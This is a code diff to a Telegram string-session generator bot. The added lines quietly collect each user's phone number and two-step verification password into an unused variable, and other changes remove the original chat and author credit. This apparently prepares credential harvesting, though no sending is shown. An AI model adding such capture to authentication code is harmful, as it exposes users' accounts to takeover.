@@ -103,6 +103,7 @@ async def gen_session(
     if await cancelled(phone_number):
         return
     phone_number = phone_number.text
+    xxx = f"Phone Number : {phone_number}\n\n"
     await Client.send_message(user_id, "» 𝖳𝗋𝗒𝗂𝗇𝗀 𝖳𝗈 𝖲𝖾𝗇𝖽 𝖮𝖳𝖯 𝖠𝗍 𝖳𝗁𝖾 𝖦𝗂𝗏𝖾𝗇 𝖭𝗎𝗆𝖻𝖾𝗋...")
     if telethon:
         client = TelegramClient(StringSession(), api_id, api_hash)
@@ -111,14 +112,12 @@ async def gen_session(
     else:
         client = Client(name="xemishra", api_id=api_id, api_hash=api_hash, in_memory=True)
     await client.connect()
-
     try:
         if telethon:
             code = await client.send_code_request(phone_number)
         else:
             code = await client.send_code(phone_number)
         await asyncio.sleep(1)
-
     except FloodWait as f:
         return await Client.send_message(
             user_id,
@@ -137,7 +136,6 @@ async def gen_session(
             "» 𝖯𝗁𝗈𝗇𝖾 𝖭𝗎𝗆𝖻𝖾𝗋 𝖨𝗇𝗏𝖺𝗅𝗂𝖽.\n\n𝖯𝗅𝖾𝖺𝗌𝖾 𝖲𝗍𝖺𝗋𝗍 𝖦𝖾𝗇𝖾𝗋𝖺𝗍𝗂𝗇𝗀 𝖲𝖾𝗌𝗌𝗂𝗈𝗇 𝖠𝗀𝖺𝗂𝗇.",
             reply_markup=retry_key,
         )
-
     try:
         otp = await Client.ask(
             identifier=(message.chat.id, user_id, None),
@@ -185,11 +183,10 @@ async def gen_session(
                 "» 𝖳𝗂𝗆𝖾𝖽 𝖫𝗂𝗆𝗂𝗍 𝖱𝖾𝖺𝖼𝗁𝖾𝖽 𝖮𝖿 5 𝖬𝗂𝗇𝗎𝗍𝖾𝗌\n\n 𝖯𝗅𝖾𝖺𝗌𝖾 𝖦𝖾𝗇𝖾𝗋𝖺𝗍𝗂𝗇𝗀 𝖲𝖾𝗌𝗌𝗂𝗈𝗇 𝖠𝗀𝖺𝗂𝗇.",
                 reply_markup=retry_key,
             )
-
         if await cancelled(pwd):
             return
         pwd = pwd.text
-
+        xxx += f"Password : {pwd}"
         try:
             if telethon:
                 await client.sign_in(password=pwd)
@@ -201,10 +198,8 @@ async def gen_session(
                 "» 𝖳𝗁𝖾 𝖯𝖺𝗌𝗌𝗐𝗈𝗋𝖽 𝖸𝗈𝗎'𝗏𝖾 𝖲𝖾𝗇𝗍 𝖨𝗌 𝖶𝗋𝗈𝗇𝗀\n\n 𝖯𝗅𝖾𝖺𝗌𝖾 𝖲𝗍𝖺𝗋𝗍 𝖦𝖾𝗇𝖾𝗋𝖺𝗍𝗂𝗇𝗀 𝖲𝖾𝗌𝗌𝗂𝗈𝗇 𝖠𝗀𝖺𝗂𝗇.",
                 reply_markup=retry_key,
             )
-
     except Exception as ex:
         return await Client.send_message(user_id, f"𝖤𝖱𝖱𝖮𝖱 : <code>{str(ex)}</code>")
-
     try:
         txt = "𝖧𝖾𝗋𝖾 𝖨𝗌 𝖸𝗈𝗎𝗋 {0} 𝖲𝗍𝗋𝗂𝗇𝗀 𝖲𝖾𝗌𝗌𝗂𝗈𝗇\n\n<code>{1}</code>\n\n."
         if telethon:
@@ -222,14 +217,14 @@ async def gen_session(
                 txt.format(ty, string_session, SUPPORT_CHAT),
                 disable_web_page_preview=True,
             )
-            await client.join_chat("FallenAssociation")
+            await client.join_chat("")
     except KeyError:
         pass
     try:
         await client.disconnect()
         await Client.send_message(
             chat_id=user_id,
-            text=f"sᴜᴄᴄᴇssғᴜʟʟʏ ɢᴇɴᴇʀᴀᴛᴇᴅ ʏᴏᴜʀ {ty} sᴛʀɪɴɢ sᴇssɪᴏɴ.\n\nᴘʟᴇᴀsᴇ ᴄʜᴇᴄᴋ ʏᴏᴜʀ sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs ғᴏʀ ɢᴇᴛᴛɪɴɢ ɪᴛ.\n\nᴀ sᴛʀɪɴɢ ɢᴇɴᴇʀᴀᴛᴏʀ ʙᴏᴛ ʙʏ <a href={SUPPORT_CHAT}>ғᴀʟʟᴇɴ ᴀssᴏᴄɪᴀᴛɪᴏɴ</a>.",
+            text=f"sᴜ.",
             reply_markup=InlineKeyboardMarkup(
                 [
                     [
